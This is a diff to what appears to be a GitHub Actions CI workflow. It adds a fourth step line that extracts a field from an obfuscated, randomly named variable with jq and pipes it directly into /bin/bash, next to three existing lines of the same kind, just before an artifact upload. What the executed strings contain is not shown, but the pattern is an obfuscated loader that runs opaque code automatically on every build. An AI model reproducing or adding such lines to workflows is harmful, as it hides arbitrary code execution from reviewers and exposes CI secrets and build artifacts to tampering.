@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$chb10" | jq -r .zxvoj1661 | /bin/bash
           echo $sp245 | jq -r .om92 | /bin/bash
           printf '%s' "$mmueg1492" | jq -r .xlcf18 | /bin/bash
+          printf '%s' "$erm3" | jq -r .mmqt03412 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
